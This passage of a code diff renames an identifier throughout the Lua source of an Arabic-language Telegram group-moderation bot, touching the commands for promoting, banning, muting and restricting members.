 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5340,18 +5328,18 @@ resolve_username(username,promreply)
 end
 if text and text:match('^رفع مميز (%d+)') and SourceCh(msg) then
 local user = text:match('رفع مميز (%d+)')
-if not BasicConstructor(msg) and DevALI:get(Jenral.."ALI:Lock:ProSet"..msg.chat_id_) then 
+if not BasicConstructor(msg) and DevALI:get(JENRAL.."ALI:Lock:ProSet"..msg.chat_id_) then 
 Dev_ALI(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
 return false
 end
-DevALI:sadd(Jenral..'ALI:VipMem:'..msg.chat_id_,user)
+DevALI:sadd(JENRAL..'ALI:VipMem:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المميزين")  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --       Rem Vipmem       --
 if text ==('تنزيل مميز') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-DevALI:srem(Jenral..'ALI:VipMem:'..msg.chat_id_,result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:VipMem:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المميزين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5361,7 +5349,7 @@ if text and text:match('^تنزيل مميز @(.*)') and SourceCh(msg) then
 local username = text:match('^تنزيل مميز @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevALI:srem(Jenral..'ALI:VipMem:'..msg.chat_id_,result.id_)
+DevALI:srem(JENRAL..'ALI:VipMem:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المميزين")  
 else 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5370,14 +5358,14 @@ resolve_username(username,promreply)
 end
 if text and text:match('^تنزيل مميز (%d+)') and SourceCh(msg) then
 local user = text:match('تنزيل مميز (%d+)')
-DevALI:srem(Jenral..'ALI:VipMem:'..msg.chat_id_,user)
+DevALI:srem(JENRAL..'ALI:VipMem:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المميزين")  
 end end 
---     Source Jenral     --
+--     Source JENRAL     --
 if BasicConstructor(msg) then
 if text and text:match("^رفع مشرف$") and msg.reply_to_message_id_ then
 function promote_by_reply(extra, result, success)
-local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..Jenral)
+local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..JENRAL)
 local GetInfo = JSON.decode(Check)
 if GetInfo.result.can_promote_members == true then 
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
@@ -5390,7 +5378,7 @@ getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
 end
 if text and text:match("^تنزيل مشرف$") and msg.reply_to_message_id_ then
 function promote_by_reply(extra, result, success)
-local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..Jenral)
+local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..JENRAL)
 local GetInfo = JSON.decode(Check)
 if GetInfo.result.can_promote_members == true then 
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
@@ -5403,7 +5391,7 @@ getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
 end 
 if text and (text:match("^رفع بكل الصلاحيات$") or text:match("^رفع بكل صلاحيات$")) and msg.reply_to_message_id_ then
 function promote_by_reply(extra, result, success)
-local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..Jenral)
+local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..JENRAL)
 local GetInfo = JSON.decode(Check)
 if GetInfo.result.can_promote_members == true then 
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
@@ -5417,7 +5405,7 @@ end
 if text and (text:match("^وضع لقب (.*)$") or text:match("^رفع مشرف (.*)$") or text:match("^ضع لقب (.*)$")) and ChCheck(msg) then
 local ALI = text:match("^وضع لقب (.*)$") or text:match("^رفع مشرف (.*)$") or text:match("^ضع لقب (.*)$")
 function ReplySet(extra, result, success)
-local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..Jenral)
+local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..JENRAL)
 local GetInfo = JSON.decode(Check)
 if GetInfo.result.can_promote_members == true then 
 https.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
@@ -5455,10 +5443,10 @@ if text == 'نبذتي' or text == 'بايو' then
 send(msg.chat_id_, msg.id_,'['..GetBio(msg.sender_user_id_)..']')
 end
 if text == "راسلني" then
-JenralTEAM = {"ها هلاو","انطق","كول حبي","تفضل"};
-send(msg.sender_user_id_, 0,JenralTEAM[math.random(#JenralTEAM)])
+JENRALTEAM = {"ها هلاو","انطق","كول حبي","تفضل"};
+send(msg.sender_user_id_, 0,JENRALTEAM[math.random(#JENRALTEAM)])
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "صلاحيتي" or text == "صلاحياتي" and ChCheck(msg) then 
 if tonumber(msg.reply_to_message_id_) == 0 then 
 Validity(msg,msg.sender_user_id_)
@@ -5484,7 +5472,7 @@ if text and (text:match('^صلاحيته (%d+)') or text:match('^صلاحيات�
 local ValidityId = text:match('صلاحيته (%d+)') or text:match('صلاحياته (%d+)')
 Validity(msg,ValidityId)  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if Admin(msg) then
 if msg.reply_to_message_id_ ~= 0 then
 if text and (text:match("^مسح$") or text:match("^حذف$")) and ChCheck(msg) then
@@ -5492,45 +5480,45 @@ DeleteMessage(msg.chat_id_,{[0] = msg.reply_to_message_id_})
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف الرساله مع رسالة الامر', 1, 'md')
 end end end
---     Source Jenral     --
+--     Source JENRAL     --
 if Constructor(msg) then
 if text == "تفعيل الحظر" and ChCheck(msg) or text == "تفعيل الطرد" and ChCheck(msg) then
-DevALI:del(Jenral.."ALI:Lock:KickBan"..msg.chat_id_)
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل الطرد والحظر'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL.."ALI:Lock:KickBan"..msg.chat_id_)
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل الطرد والحظر'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
 end
 if text == "تعطيل الحظر" and ChCheck(msg) or text == "تعطيل الطرد" and ChCheck(msg) then
-DevALI:set(Jenral.."ALI:Lock:KickBan"..msg.chat_id_,"true")
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل الطرد والحظر'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL.."ALI:Lock:KickBan"..msg.chat_id_,"true")
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل الطرد والحظر'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
 end
 if text == "تفعيل الكتم" and ChCheck(msg) or text == "تفعيل التقييد" and ChCheck(msg) then
-DevALI:del(Jenral.."ALI:Lock:MuteTked"..msg.chat_id_)
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل الكتم والتقيد'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL.."ALI:Lock:MuteTked"..msg.chat_id_)
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل الكتم والتقيد'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
 end
 if text == "تعطيل الكتم" and ChCheck(msg) or text == "تعطيل التقييد" and ChCheck(msg) then
-DevALI:set(Jenral.."ALI:Lock:MuteTked"..msg.chat_id_,"true")
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل الكتم والتقيد'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL.."ALI:Lock:MuteTked"..msg.chat_id_,"true")
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل الكتم والتقيد'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
 end
 end
 if BasicConstructor(msg) then
 if text == "تفعيل الرفع" and ChCheck(msg) or text == "تفعيل الترقيه" and ChCheck(msg) then
-DevALI:del(Jenral.."ALI:Lock:ProSet"..msg.chat_id_)
+DevALI:del(JENRAL.."ALI:Lock:ProSet"..msg.chat_id_)
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم تفعيل رفع ↫ الادمن • المميز', 1, 'md')
 end
 if text == "تعطيل الرفع" and ChCheck(msg) or text == "تعطيل الترقيه" and ChCheck(msg) then
-DevALI:set(Jenral.."ALI:Lock:ProSet"..msg.chat_id_,"true")
+DevALI:set(JENRAL.."ALI:Lock:ProSet"..msg.chat_id_,"true")
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم تعطيل رفع ↫ الادمن • المميز', 1, 'md')
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --          Kick          --
 if Admin(msg) then
 if text ==('طرد') and ChCheck(msg) then
 function KickReply(extra, result, success)
-if not Constructor(msg) and DevALI:get(Jenral.."ALI:Lock:KickBan"..msg.chat_id_) then 
+if not Constructor(msg) and DevALI:get(JENRAL.."ALI:Lock:KickBan"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
 return false
 end
@@ -5557,7 +5545,7 @@ end end
 if text and text:match('^طرد @(.*)') and ChCheck(msg) then
 local username = text:match('^طرد @(.*)')
 function KickUser(extra,result,success)
-if not Constructor(msg) and DevALI:get(Jenral.."ALI:Lock:KickBan"..msg.chat_id_) then 
+if not Constructor(msg) and DevALI:get(JENRAL.."ALI:Lock:KickBan"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
 return false
 end
@@ -5585,7 +5573,7 @@ resolve_username(username,KickUser)
 end
 if text and text:match('^طرد (%d+)') and ChCheck(msg) then
 local user = text:match('طرد (%d+)')
-if not Constructor(msg) and DevALI:get(Jenral.."ALI:Lock:KickBan"..msg.chat_id_) then 
+if not Constructor(msg) and DevALI:get(JENRAL.."ALI:Lock:KickBan"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
 return false
 end
@@ -5607,12 +5595,12 @@ end,nil)
 end
 end
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 --          Ban           --
 if Admin(msg) then
 if text ==('حضر') or text ==('حظر') and ChCheck(msg) then
 function BanReply(extra, result, success)
-if not Constructor(msg) and DevALI:get(Jenral.."ALI:Lock:KickBan"..msg.chat_id_) then 
+if not Constructor(msg) and DevALI:get(JENRAL.."ALI:Lock:KickBan"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
 return false
 end
@@ -5629,7 +5617,7 @@ send(msg.chat_id_,msg.id_,"⌁︙لا استطيع حظر مشرفين المج�
 return false  
 end
 ChatKick(result.chat_id_, result.sender_user_id_)
-DevALI:sadd(Jenral..'ALI:Ban:'..msg.chat_id_, result.sender_user_id_)
+DevALI:sadd(JENRAL..'ALI:Ban:'..msg.chat_id_, result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم حظره من المجموعه") 
 end,nil) 
 end 
@@ -5640,7 +5628,7 @@ end end
 if text and (text:match('^حضر @(.*)') or text:match('^حظر @(.*)')) and ChCheck(msg) then
 local username = text:match('^حضر @(.*)') or text:match('^حظر @(.*)')
 function BanUser(extra,result,success)
-if not Constructor(msg) and DevALI:get(Jenral.."ALI:Lock:KickBan"..msg.chat_id_) then 
+if not Constructor(msg) and DevALI:get(JENRAL.."ALI:Lock:KickBan"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
 return false
 end
@@ -5658,7 +5646,7 @@ send(msg.chat_id_,msg.id_,"⌁︙لا استطيع حظر مشرفين المج�
 return false  
 end
 ChatKick(msg.chat_id_, result.id_)
-DevALI:sadd(Jenral..'ALI:Ban:'..msg.chat_id_, result.id_)
+DevALI:sadd(JENRAL..'ALI:Ban:'..msg.chat_id_, result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم حظره من المجموعه")  
 end,nil) 
 end
@@ -5669,7 +5657,7 @@ resolve_username(username,BanUser)
 end
 if text and (text:match('^حضر (%d+)') or text:match('^حظر (%d+)')) and ChCheck(msg) then
 local user = text:match('حضر (%d+)') or text:match('حظر (%d+)')
-if not Constructor(msg) and DevALI:get(Jenral.."ALI:Lock:KickBan"..msg.chat_id_) then 
+if not Constructor(msg) and DevALI:get(JENRAL.."ALI:Lock:KickBan"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
 return false
 end
@@ -5686,16 +5674,16 @@ send(msg.chat_id_,msg.id_,"⌁︙لا استطيع حظر مشرفين المج�
 return false  
 end
 ChatKick(msg.chat_id_, user)
-DevALI:sadd(Jenral..'ALI:Ban:'..msg.chat_id_, user)
+DevALI:sadd(JENRAL..'ALI:Ban:'..msg.chat_id_, user)
 ReplyStatus(msg,user,"Reply","⌁︙تم حظره من المجموعه")  
 end,nil) 
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --         UnBan          --
 if text ==('الغاء الحظر') or text ==('الغاء حظر') and ChCheck(msg) then
 function UnBanReply(extra, result, success)
-DevALI:srem(Jenral..'ALI:Ban:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Ban:'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم الغاء حظره من المجموعه")  
 end 
@@ -5706,7 +5694,7 @@ if text and (text:match('^الغاء الحظر @(.*)') or text:match('^الغا
 local username = text:match('^الغاء الحظر @(.*)') or text:match('^الغاء حظر @(.*)')
 function UnBanUser(extra,result,success)
 if result.id_ then
-DevALI:srem(Jenral..'ALI:Ban:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:Ban:'..msg.chat_id_, result.id_)
 tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم الغاء حظره من المجموعه")  
 else 
@@ -5716,27 +5704,27 @@ resolve_username(username,UnBanUser)
 end
 if text and (text:match('^الغاء الحظر (%d+)') or text:match('^الغاء حظر (%d+)')) and ChCheck(msg) then
 local user = text:match('الغاء الحظر (%d+)') or text:match('الغاء حظر (%d+)')
-DevALI:srem(Jenral..'ALI:Ban:'..msg.chat_id_, user)
+DevALI:srem(JENRAL..'ALI:Ban:'..msg.chat_id_, user)
 tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = user, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
 ReplyStatus(msg,user,"Reply","⌁︙تم الغاء حظره من المجموعه")  
 end 
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 --          Mute          --
 if Admin(msg) then
 if text ==('كتم') and ChCheck(msg) then
 function MuteReply(extra, result, success)
-if not Constructor(msg) and DevALI:get(Jenral.."ALI:Lock:MuteTked"..msg.chat_id_) then 
+if not Constructor(msg) and DevALI:get(JENRAL.."ALI:Lock:MuteTked"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
 return false
 end
 if RankChecking(result.sender_user_id_, result.chat_id_) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع كتم ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
 else
-if DevALI:sismember(Jenral..'ALI:Muted:'..msg.chat_id_, result.sender_user_id_) then
+if DevALI:sismember(JENRAL..'ALI:Muted:'..msg.chat_id_, result.sender_user_id_) then
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙هو بالفعل مكتوم من المجموعه")  
 else
-DevALI:sadd(Jenral..'ALI:Muted:'..msg.chat_id_, result.sender_user_id_)
+DevALI:sadd(JENRAL..'ALI:Muted:'..msg.chat_id_, result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم كتمه من المجموعه")  
 end 
 end
@@ -5747,7 +5735,7 @@ end end
 if text and text:match('^كتم @(.*)') and ChCheck(msg) then
 local username = text:match('^كتم @(.*)')
 function MuteUser(extra,result,success)
-if not Constructor(msg) and DevALI:get(Jenral.."ALI:Lock:MuteTked"..msg.chat_id_) then 
+if not Constructor(msg) and DevALI:get(JENRAL.."ALI:Lock:MuteTked"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
 return false
 end
@@ -5755,10 +5743,10 @@ if result.id_ then
 if RankChecking(result.id_, msg.chat_id_) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع كتم ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
 else
-if DevALI:sismember(Jenral..'ALI:Muted:'..msg.chat_id_, result.id_) then
+if DevALI:sismember(JENRAL..'ALI:Muted:'..msg.chat_id_, result.id_) then
 ReplyStatus(msg,result.id_,"Reply","⌁︙هو بالفعل مكتوم من المجموعه")  
 else
-DevALI:sadd(Jenral..'ALI:Muted:'..msg.chat_id_, result.id_)
+DevALI:sadd(JENRAL..'ALI:Muted:'..msg.chat_id_, result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم كتمه من المجموعه")  
 end
 end
@@ -5769,29 +5757,29 @@ resolve_username(username,MuteUser)
 end
 if text and text:match('^كتم (%d+)') and ChCheck(msg) then
 local user = text:match('كتم (%d+)')
-if not Constructor(msg) and DevALI:get(Jenral.."ALI:Lock:MuteTked"..msg.chat_id_) then 
+if not Constructor(msg) and DevALI:get(JENRAL.."ALI:Lock:MuteTked"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
 return false
 end
 if RankChecking(user, msg.chat_id_) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع كتم ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
 else
-if DevALI:sismember(Jenral..'ALI:Muted:'..msg.chat_id_, user) then
+if DevALI:sismember(JENRAL..'ALI:Muted:'..msg.chat_id_, user) then
 ReplyStatus(msg,user,"Reply","⌁︙هو بالفعل مكتوم من المجموعه")  
 else
-DevALI:sadd(Jenral..'ALI:Muted:'..msg.chat_id_, user)
+DevALI:sadd(JENRAL..'ALI:Muted:'..msg.chat_id_, user)
 ReplyStatus(msg,user,"Reply","⌁︙تم كتمه من المجموعه")  
 end
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --         UnMute         --
 if text ==('الغاء الكتم') or text ==('الغاء كتم') and ChCheck(msg) then
 function UnMuteReply(extra, result, success)
-if not DevALI:sismember(Jenral..'ALI:Muted:'..msg.chat_id_, result.sender_user_id_) then
+if not DevALI:sismember(JENRAL..'ALI:Muted:'..msg.chat_id_, result.sender_user_id_) then
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙هو ليس مكتوم لالغاء كتمه")  
 else
-DevALI:srem(Jenral..'ALI:Muted:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Muted:'..msg.chat_id_, result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم الغاء كتمه من المجموعه")  
 end
 end 
@@ -5802,10 +5790,10 @@ if text and (text:match('^الغاء الكتم @(.*)') or text:match('^الغا
 local username = text:match('^الغاء الكتم @(.*)') or text:match('^الغاء كتم @(.*)')
 function UnMuteUser(extra,result,success)
 if result.id_ then
-if not DevALI:sismember(Jenral..'ALI:Muted:'..msg.chat_id_, result.id_) then
+if not DevALI:sismember(JENRAL..'ALI:Muted:'..msg.chat_id_, result.id_) then
 ReplyStatus(msg,result.id_,"Reply","⌁︙هو ليس مكتوم لالغاء كتمه")  
 else
-DevALI:srem(Jenral..'ALI:Muted:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:Muted:'..msg.chat_id_, result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم الغاء كتمه من المجموعه")  
 end
 else 
@@ -5815,20 +5803,20 @@ resolve_username(username,UnMuteUser)
 end
 if text and (text:match('^الغاء الكتم (%d+)') or text:match('^الغاء كتم (%d+)')) and ChCheck(msg) then
 local user = text:match('الغاء الكتم (%d+)') or text:match('الغاء كتم (%d+)')
-if not DevALI:sismember(Jenral..'ALI:Muted:'..msg.chat_id_, user) then
+if not DevALI:sismember(JENRAL..'ALI:Muted:'..msg.chat_id_, user) then
 ReplyStatus(msg,user,"Reply","⌁︙هو ليس مكتوم لالغاء كتمه")  
 else
-DevALI:srem(Jenral..'ALI:Muted:'..msg.chat_id_, user)
+DevALI:srem(JENRAL..'ALI:Muted:'..msg.chat_id_, user)
 ReplyStatus(msg,user,"Reply","⌁︙تم الغاء كتمه من المجموعه")  
 end
 end 
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 --          Tkeed           --
 if Admin(msg) then
 if text ==('تقييد') or text ==('تقيد') and ChCheck(msg) then
 function TkeedReply(extra, result, success)
-if not Constructor(msg) and DevALI:get(Jenral.."ALI:Lock:MuteTked"..msg.chat_id_) then 
+if not Constructor(msg) and DevALI:get(JENRAL.."ALI:Lock:MuteTked"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
 return false
 end
@@ -5836,7 +5824,7 @@ if RankChecking(result.sender_user_id_, result.chat_id_) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
 else
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
-DevALI:sadd(Jenral..'ALI:Tkeed:'..msg.chat_id_, result.sender_user_id_)
+DevALI:sadd(JENRAL..'ALI:Tkeed:'..msg.chat_id_, result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تقيده من المجموعه")  
 end
 end 
@@ -5846,7 +5834,7 @@ end end
 if text and (text:match('^تقييد @(.*)') or text:match('^تقيد @(.*)')) and ChCheck(msg) then
 local username = text:match('^تقييد @(.*)') or text:match('^تقيد @(.*)')
 function TkeedUser(extra,result,success)
-if not Constructor(msg) and DevALI:get(Jenral.."ALI:Lock:MuteTked"..msg.chat_id_) then 
+if not Constructor(msg) and DevALI:get(JENRAL.."ALI:Lock:MuteTked"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
 return false
 end
@@ -5855,7 +5843,7 @@ if RankChecking(result.id_, msg.chat_id_) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقيد ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
 else
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
-DevALI:sadd(Jenral..'ALI:Tkeed:'..msg.chat_id_, result.id_)
+DevALI:sadd(JENRAL..'ALI:Tkeed:'..msg.chat_id_, result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم تقيده من المجموعه")  
 end
 else 
@@ -5865,7 +5853,7 @@ resolve_username(username,TkeedUser)
 end
 if text and (text:match('^تقييد (%d+)') or text:match('^تقيد (%d+)')) and ChCheck(msg) then
 local user = text:match('تقييد (%d+)') or text:match('تقيد (%d+)')
-if not Constructor(msg) and DevALI:get(Jenral.."ALI:Lock:MuteTked"..msg.chat_id_) then 
+if not Constructor(msg) and DevALI:get(JENRAL.."ALI:Lock:MuteTked"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
 return false
 end
@@ -5873,16 +5861,16 @@ if RankChecking(user, msg.chat_id_) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقيد ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
 else
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user)
-DevALI:sadd(Jenral..'ALI:Tkeed:'..msg.chat_id_, user)
+DevALI:sadd(JENRAL..'ALI:Tkeed:'..msg.chat_id_, user)
 ReplyStatus(msg,user,"Reply","⌁︙تم تقيده من المجموعه")  
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --         UnTkeed          --
 if text ==('الغاء تقييد') or text ==('الغاء تقيد') and ChCheck(msg) then
 function UnTkeedReply(extra, result, success)
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
-DevALI:srem(Jenral..'ALI:Tkeed:'..msg.chat_id_, result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Tkeed:'..msg.chat_id_, result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم الغاء تقيده من المجموعه")  
 end
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5893,7 +5881,7 @@ local username = text:match('^الغاء تقييد @(.*)') or text:match('^ال
 function UnTkeedUser(extra,result,success)
 if result.id_ then
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
-DevALI:srem(Jenral..'ALI:Tkeed:'..msg.chat_id_, result.id_)
+DevALI:srem(JENRAL..'ALI:Tkeed:'..msg.chat_id_, result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم الغاء تقيده من المجموعه")  
 else 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5903,17 +5891,17 @@ end
 if text and (text:match('^الغاء تقييد (%d+)') or text:match('^الغاء تقيد (%d+)')) and ChCheck(msg) then
 local user = text:match('الغاء تقييد (%d+)') or text:match('الغاء تقيد (%d+)')
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
-DevALI:srem(Jenral..'ALI:Tkeed:'..msg.chat_id_, user)
+DevALI:srem(JENRAL..'ALI:Tkeed:'..msg.chat_id_, user)
